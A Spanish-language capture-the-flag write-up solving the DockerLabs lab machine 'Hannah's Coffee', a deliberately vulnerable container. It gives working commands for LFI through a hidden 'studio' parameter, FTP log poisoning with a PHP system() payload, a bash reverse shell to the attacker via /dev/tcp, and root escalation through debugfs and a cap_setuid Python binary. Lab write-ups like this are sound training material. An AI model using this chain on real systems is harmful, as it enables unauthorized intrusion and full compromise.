# Hannah's Coffee - DockerLabs (Fácil)

**Dificultad:** Fácil
**Fecha:** 09/2026
**Sistema:** Linux
**IP objetivo:** `172.17.0.2`
**Acceso inicial:** RCE vía LFI + FTP Log Poisoning

## Herramientas

`arp-scan` `Nmap` `Gobuster` `wfuzz` `ffuf` `curl` `FTP` `Netcat` `debugfs` `Python` `getcap`

## Técnicas

`Network Discovery` `Network Enumeration` `Web Enumeration` `Parameter Fuzzing` `Local File Inclusion` `FTP Log Poisoning` `Remote Code Execution` `Reverse Shell` `Sudo Privilege Escalation` `Linux Capabilities Abuse`

## Introducción

Máquina de nivel Fácil centrada en una cadena de explotación más elaborada: Inclusión Local de Archivos (LFI) combinada con FTP Log Poisoning para lograr ejecución remota de comandos, y escalada de privilegios en dos saltos mediante sudo y abuso de capabilities de Linux.

## Reconocimiento

### Descubrimiento de host (red Docker)

```
sudo arp-scan -I docker0 --localnet --resolve
```

### Escaneo de puertos

```
nmap -p- -sV -sC --open -sS -vvv -n -Pn --min-rate 5000 172.17.0.2
```

Resultado relevante:

```
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    Apache httpd 2.4.68 (Debian) - "Hannah's Coffee"
```

## Enumeración web

La aplicación usa un patrón de router simple: `index.php?page=home|menu|about|contact`, cada valor correspondiente a un archivo estático dentro de `pages/`.

```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js
```

Se confirma la carpeta `pages/` con los archivos `home.php`, `menu.php`, `about.php` y `contact.php`, cada uno estático y sin lógica propia (no procesan parámetros por sí mismos).

Se intentó explotar LFI directamente sobre el parámetro `page` (path traversal, wrappers PHP, evasión de filtros), sin éxito: el parámetro está protegido, probablemente mediante una lista blanca de valores válidos, devolviendo siempre el contenido de Home ante cualquier valor no reconocido.

## Parameter Fuzzing

Ante la falta de resultados sobre `page`, se buscó un parámetro GET oculto no visible en la interfaz. El fuzzing con una wordlist de nombres de parámetros comunes no dio resultados. Usando wfuzz con una wordlist de palabras generales (en este caso, una lista de subdominios usada como diccionario de palabras variadas) se identificó un parámetro distinto:

```
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hl 29 -u "http://172.17.0.2/index.php?FUZZ=test"
```

El valor 29 corresponde a la cantidad de líneas de la respuesta por defecto (Home), obtenida previamente con `curl -s "http://172.17.0.2/index.php?page=home" | wc -l`, usado como filtro para descartar el ruido de parámetros inexistentes.

Resultado: el parámetro `studio` responde de forma distinta (24 líneas en vez de 29), coincidiendo además con la mención de un "Roasting Studio" en el texto de la página de inicio.

## Confirmación del LFI

```
curl "http://172.17.0.2/index.php?studio=../../../../etc/passwd"
```

El parámetro `studio` sí es vulnerable a Local File Inclusion sin restricciones. Se obtiene el contenido de /etc/passwd, revelando dos usuarios con shell interactiva: `hannahftp` y `hannah`.

## FTP Log Poisoning

Se confirma la lectura del log de vsftpd a través del LFI:

```
curl "http://172.17.0.2/index.php?studio=../../../../var/log/vsftpd.log"
```

El log es legible y registra los intentos de conexión, incluyendo el nombre de usuario ingresado (exista o no). Se envenena el log conectándose por FTP y usando código PHP como nombre de usuario:

```
ftp 172.17.0.2
Name: <?php system($_GET['cmd']); ?>
Password: (cualquiera)
```

El intento de login falla, pero el código PHP queda escrito tal cual dentro del log. Al incluir ese archivo a través del LFI, PHP interpreta y ejecuta el código embebido, permitiendo ejecución de comandos mediante un parámetro adicional `cmd`:

```
curl "http://172.17.0.2/index.php?studio=../../../../var/log/vsftpd.log&cmd=id"
```

Resultado: el comando se ejecuta como www-data, confirmado en el propio log como salida del comando.

## Obtención de shell interactiva

Se establece un listener en la máquina atacante:

```
nc -lvnp 4444
```

Y se ejecuta una reverse shell a través del mismo vector de RCE:

```
curl "http://172.17.0.2/index.php?studio=../../../../var/log/vsftpd.log" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'" -G
```

Acceso confirmado como www-data.

## Escalada de privilegios (primer salto: www-data a hannah)

```
sudo -l
```

Resultado:
```
User www-data may run the following commands on 0c20a6921b9d:
    (hannah) NOPASSWD: /sbin/debugfs -w /opt/hannah_disk.img
```

debugfs permite manipular imágenes de sistemas de archivos en modo escritura, y admite escapar a una shell del sistema desde su consola interactiva:

```
sudo -u hannah /sbin/debugfs -w /opt/hannah_disk.img
```

Dentro de la consola de debugfs:
```
! /bin/bash
```

Acceso confirmado como hannah.

## Escalada de privilegios (segundo salto: hannah a root)

Búsqueda de binarios con capabilities especiales asignadas:

```
getcap -r / 2>/dev/null
```

Resultado:
```
/opt/priv-python cap_setuid=ep
```

Un intérprete de Python con la capability cap_setuid permite cambiar el UID del proceso actual a cualquier valor, incluido 0 (root), sin necesitar privilegios adicionales:

```
/opt/priv-python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Confirmación de acceso total:
```
whoami
```
Resultado: root

## Conclusión

Máquina notablemente más elaborada que las de nivel Muy Fácil resueltas anteriormente. El punto más desafiante fue localizar el parámetro vulnerable real (studio), oculto detrás de un parámetro señuelo (page) protegido con lista blanca; esto refuerza la importancia del fuzzing de parámetros como paso propio, distinto e independiente del fuzzing de directorios. El resto de la cadena combina dos técnicas no vistas hasta ahora en este recorrido: FTP Log Poisoning como método de RCE a partir de un LFI, y abuso de Linux capabilities como vector de escalada final, distinto a los patrones de sudo abuse vistos en máquinas anteriores.
